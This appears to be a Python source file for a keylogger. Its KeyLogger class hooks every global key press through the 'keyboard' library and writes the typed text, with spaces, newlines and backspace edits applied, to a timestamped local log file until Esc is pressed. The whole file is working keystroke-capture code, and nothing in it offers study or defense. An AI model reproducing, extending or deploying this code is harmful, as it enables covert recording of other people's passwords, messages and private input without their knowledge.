import keyboard
import datetime
import sched
from utils import stringDec
import json


settings = open('settings.json', 'r').read()
settings = json.loads(settings)
stringDec("SETTINGS", print, settings)


APPEND_MODE = settings["APPEND_MODE"]


class KeyLogger:
    def __init__(self, duration, interval=10):
        self.interval = interval
        self.duration = duration
        self.startTime = datetime.datetime.now()
        self.logfile = f"keylog[{self.startTime},{self.duration}].txt"
        # self.logfile = f"keylog.txt"
        self.strokes = ""

    def callback(self, event:keyboard.KeyboardEvent):

        if event.name == 'space':
            self.strokes += ' '
        elif event.name == 'backspace':
            try:
                self.strokes = self.strokes[:-1]
            except:
                pass
        elif event.name == 'enter':
            self.strokes += '\n'
        # elif(len(event.name)>1):
        #     pass

        else:
            self.strokes += event.name

        if(APPEND_MODE):
            with open(self.logfile, 'a') as f:
                f.write(self.strokes)  
                self.strokes=""  
        else:
            with open(self.logfile, 'w+') as f:
                f.write(self.strokes)

    def startLogging(self):
        keyboard.on_press(self.callback, suppress=True)
        keyboard.wait('esc')

